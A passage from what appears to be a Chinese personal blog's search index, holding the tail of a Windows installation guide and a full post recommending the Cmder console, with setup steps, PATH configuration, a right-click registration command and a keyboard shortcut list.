磁盘。</p><p>方法：利用DiskGenius或者傲梅分区助手，将硬盘转换为GUID格式即可</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/DG1.png"></p><p>安装完后，系统会自动重启，请移除你的U盘！</p><h4 id="2-4、安装完成"><a href="#2-4、安装完成" class="headerlink" title="2.4、安装完成"></a>2.4、安装完成</h4><p>系统已经安装完成，请根据系统提示配置你的电脑！</p><h3 id="下次有谁再问我怎么装系统，或者有人问你怎么装系统，请把这篇文章给他-x2F-她看！"><a href="#下次有谁再问我怎么装系统，或者有人问你怎么装系统，请把这篇文章给他-x2F-她看！" class="headerlink" title="下次有谁再问我怎么装系统，或者有人问你怎么装系统，请把这篇文章给他&#x2F;她看！"></a>下次有谁再问我怎么装系统，或者有人问你怎么装系统，请把这篇文章给他&#x2F;她看！</h3><h6 id="如果有什么问题，可以在评论区内告诉我，推荐使用Github账号登录，这样我可以快速找到你！"><a href="#如果有什么问题，可以在评论区内告诉我，推荐使用Github账号登录，这样我可以快速找到你！" class="headerlink" title="如果有什么问题，可以在评论区内告诉我，推荐使用Github账号登录，这样我可以快速找到你！"></a>如果有什么问题，可以在评论区内告诉我，推荐使用Github账号登录，这样我可以快速找到你！</h6><h6 id="封面原图出处"><a href="#封面原图出处" class="headerlink" title="封面原图出处"></a>封面原图<a href="https://www.pixiv.net/member_illust.php?mode=medium&illust_id=72039875">出处</a></h6><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Windows-Setup/Cover.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cmd的互替软件，让Cmder来帮助你更好地使用控制台！</title>
      <link href="/posts/cmder/"/>
      <url>/posts/cmder/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><img src="https://cmder.net/img/main.png" alt="Cmder"></p><h4 id="问题：什么是Cmd？"><a href="#问题：什么是Cmd？" class="headerlink" title="问题：什么是Cmd？"></a>问题：什么是Cmd？</h4><p>命令提示符是在操作系统中，提示进行命令输入的一种工作提示符。在不同的操作系统环境下，命令提示符各不相同。在windows环境下，命令行程序为cmd.exe，是一个32位的命令行程序，微软Windows系统基于Windows上的命令解释程序，类似于微软的<a href="https://baike.baidu.com/item/DOS%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F">DOS操作系统</a>。  ——来自 <a href="https://baike.baidu.com/item/%E5%91%BD%E4%BB%A4%E6%8F%90%E7%A4%BA%E7%AC%A6">百度百科</a></p><h4 id="为什么要用Cmder来替换Cmd呢？"><a href="#为什么要用Cmder来替换Cmd呢？" class="headerlink" title="为什么要用Cmder来替换Cmd呢？"></a>为什么要用Cmder来替换Cmd呢？</h4><p>1、<strong>Cmd</strong>有的时候复制粘贴很麻烦，<strong>Cmder</strong>则不会</p><p>2、<strong>Cmder</strong>可以分屏多开窗口，<strong>Cmd</strong>不行</p><p>3、<strong>Cmder</strong>可以设置窗口颜色,字体大小（更加美观）</p><p>4、<strong>Cmder</strong>有很多快捷键和谷歌浏览器操作类似（反正就是很多功能）</p><h4 id="下载地址（官网）："><a href="#下载地址（官网）：" class="headerlink" title="下载地址（官网）："></a>下载地址（官网）：</h4><p><a href="http://cmder.net/">Cmder官网</a></p><p>官网下载有mini版和完整版，我建议完整版（虽然我也不知道两个之间有什么区别，或许是少了点命令？）</p><h4 id="一点小技巧："><a href="#一点小技巧：" class="headerlink" title="一点小技巧："></a>一点小技巧：</h4><p>你可以在系统属性里面配置环境变量，把cmder的路径加入到<code>path</code>里面去</p><p>然后以管理员身份打开cmd，输入</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 设置任意地方鼠标右键启动Cmder</span></span><br><span class="line">Cmder.exe /REGISTER ALL</span><br></pre></td></tr></table></figure><p>然后你就可以像我一样在任意地方打开cmder了</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/cmder/cmder-here.png" alt="cmder-here"></p><h4 id="快捷键大全（官网有）："><a href="#快捷键大全（官网有）：" class="headerlink" title="快捷键大全（官网有）："></a>快捷键大全（官网有）：</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Tab       自动路径补全</span><br><span class="line">Ctrl+T    建立新页签</span><br><span class="line">Ctrl+W    关闭页签</span><br><span class="line">Ctrl+Tab  切换页签</span><br><span class="line">Alt+F4    关闭所有页签</span><br><span class="line">Alt+Shift+1 开启cmd.exe</span><br><span class="line">Alt+Shift+2 开启powershell.exe</span><br><span class="line">Alt+Shift+3 开启powershell.exe (系统管理员权限)</span><br><span class="line">Ctrl+1      快速切换到第1个页签</span><br><span class="line">Ctrl+n      快速切换到第n个页签(n无上限)</span><br><span class="line">Alt + enter 切换到全屏状态</span><br><span class="line">Ctrl+r       历史命令搜索</span><br><span class="line">Win+Alt+P   开启工具选项视窗</span><br></pre></td></tr></table></figure><h6 id="TIPS：如果中文不能正常显示，可以在设置的环境选项-Settings–-gt-Startup–-gt-Eniviroment-内加入以下语句"><a href="#TIPS：如果中文不能正常显示，可以在设置的环境选项-Settings–-gt-Startup–-gt-Eniviroment-内加入以下语句" class="headerlink" title="TIPS：如果中文不能正常显示，可以在设置的环境选项(Settings–&gt;Startup–&gt;Eniviroment)内加入以下语句"></a>TIPS：如果中文不能正常显示，可以在设置的环境选项(Settings–&gt;Startup–&gt;Eniviroment)内加入以下语句</h6><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set LANG=zh_CN.UTF8 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/cmder/cmder-cn.png" alt="cmder-cn"></p><h6 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h6><p>1、我没有收广告费，单纯是因为它很好用</p><p>2、Win10还是比较推荐Powershell的，但是win10以下powershell（即使内置）是没有在环境变量中的，所以win10以下我还是会用cmder</p><hr><h6 id="后期更新："><a href="#后期更新：" class="headerlink" title="后期更新："></a>后期更新：</h6><p>Powershell真香！</p><hr><div class="note success flat"><h3 id="2020-3-19-更新"><a href="#2020-3-19-更新" class="headerlink" title="2020.3.19 更新"></a>2020.3.19 更新</h3><p>应评论区用户要求，我就来讲讲小白式玩法~</p><h4 id="第一点：将cmder加入PATH变量"><a href="#第一点：将cmder加入PATH变量" class="headerlink" title="第一点：将cmder加入PATH变量"></a>第一点：将cmder加入PATH变量</h4><p>以Win10为例（Win10以下的path变量管理界面不一样，但是道理还是一样的）</p><p>我们首先右键我的电脑（此电脑），然后选择属性</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/This-Computer-Properties.png"></p><p>在此电脑的属性页面中选择<code>高级系统设置</code></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/Properties-Settings.png"></p><p>在打开来的窗口选择环境变量</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/Settings-env.png"></p><p>然后在上面的用户变量栏里面选择<code>path</code>然后点击编辑</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/env-path.png"></p><p>在右侧点击<code>新建</code>，然后在框框里面先随便输入点内容（因为如果不输入直接点浏览的话会覆盖掉上面的数据）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/path-new.png"></p><p>接着选择浏览，选到你的cmder存放的目录，我这里是在<code>G:\cmder</code>，所以直接选择到这里就好了</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/select-folder.png"></p><p>点击确定，在左边的环境变量栏里面就会有刚刚选择的目录路径了</p><p>接着打开<code>运行</code>，你也可以通过<code>Win</code>+<code>R</code>来打开，在里面输入cmder然后确定</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/run.png"></p><p>如果你能正常打开cmder就说明你设置成功啦！</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/cmder.png"></p><p>上面说的把cmder加入到右键菜单，在电脑左下角的Win标那里右键，选择<code>命令提示符（管理员）</code>或者<code>Windows Powershell（管理员）</code></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@cmder/img/cmder/Powershell-run-as-admin.png"></p><p>把上面的那一串命令打进去就可以了。</p><p>你是不是完成配置了呢？那就开始你的cmder之旅吧！</p></div>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
